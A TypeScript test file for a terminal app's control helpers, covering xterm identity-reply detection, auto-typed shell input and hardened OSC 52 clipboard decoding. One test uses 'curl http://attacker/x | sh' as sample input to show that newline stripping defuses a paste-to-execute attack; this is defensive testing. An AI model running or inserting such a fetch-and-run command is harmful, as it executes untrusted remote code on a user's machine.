import { beforeEach, describe, expect, it } from "vitest";
import {
  OSC52_MAX_CHARS,
  claimInitialInput,
  clearClaimedInitialInputsForTest,
  decodeOsc52Clipboard,
  initialInputForPty,
  isTerminalIdentityResponse,
} from "../lib/terminalControl";

describe("terminal control helpers", () => {
  beforeEach(() => {
    clearClaimedInitialInputsForTest();
  });

  it("detects xterm identity replies that must not become shell input", () => {
    expect(isTerminalIdentityResponse("\x1b[>0;276;0c")).toBe(true);
    expect(isTerminalIdentityResponse("\x1b[?1;2c")).toBe(true);
    expect(isTerminalIdentityResponse("\x1b[>0;276;0c\x1b[?1;2c")).toBe(true);
  });

  it("does not classify ordinary command text as a terminal identity reply", () => {
    expect(isTerminalIdentityResponse("PATH=/usr/bin:$PATH bash 'install.sh'")).toBe(false);
    expect(isTerminalIdentityResponse("0;276;0cPATH=/usr/bin:$PATH bash 'install.sh'")).toBe(false);
  });

  it("clears shell readline before auto-typing commands", () => {
    expect(initialInputForPty("bash 'install.sh'", "shell")).toBe("\x15bash 'install.sh'");
    expect(initialInputForPty("/hooks", "agent")).toBe("/hooks");
  });

  it("claims a given initial input only once per PTY id", () => {
    expect(claimInitialInput("p:shell-1", "bash 'install.sh'")).toBe(true);
    expect(claimInitialInput("p:shell-1", "bash 'install.sh'")).toBe(false);
    expect(claimInitialInput("p:shell-2", "bash 'install.sh'")).toBe(true);
    expect(claimInitialInput("p:shell-1", "bash 'other.sh'")).toBe(true);
  });
});

/** OSC 52 payload: `Pc ; <base64>`. */
const osc52 = (text: string, pc = "c") => `${pc};${btoa(text)}`;

describe("OSC 52 clipboard writes are bounded, not trusted", () => {
  it("accepts an ordinary clipboard write on the clipboard registers", () => {
    expect(decodeOsc52Clipboard(osc52("git log --oneline"))).toBe("git log --oneline");
    // "" is the spec default (also the clipboard); "cp"/"cs" include it.
    expect(decodeOsc52Clipboard(osc52("hello", ""))).toBe("hello");
    expect(decodeOsc52Clipboard(osc52("hello", "cp"))).toBe("hello");
  });

  it("strips newlines — the byte that turns a paste into an executed command", () => {
    // The headline attack: a payload whose own newline submits it the moment the
    // user pastes into a shell or a sudo prompt.
    expect(decodeOsc52Clipboard(osc52("curl http://attacker/x | sh\n"))).toBe(
      "curl http://attacker/x | sh ",
    );
    expect(decodeOsc52Clipboard(osc52("a\r\nb\nc"))).toBe("a b c");
    expect(decodeOsc52Clipboard(osc52("\n\n"))).toBe(" ");
  });

  it("caps the payload length", () => {
    const long = "x".repeat(OSC52_MAX_CHARS + 500);
    expect(decodeOsc52Clipboard(osc52(long))!.length).toBe(OSC52_MAX_CHARS);
  });

  it("refuses a read-back query, a non-clipboard register, and a malformed payload", () => {
    // `Pc;?` would let any program read whatever the user last copied.
    expect(decodeOsc52Clipboard("c;?")).toBeNull();
    // Primary-selection-only is not Eldrun's one clipboard.
    expect(decodeOsc52Clipboard(osc52("hello", "p"))).toBeNull();
    expect(decodeOsc52Clipboard("c")).toBeNull();
    expect(decodeOsc52Clipboard("c;!!!not-base64!!!")).toBeNull();
    // Nothing left after stripping → nothing to set.
    expect(decodeOsc52Clipboard(osc52(""))).toBeNull();
  });
});
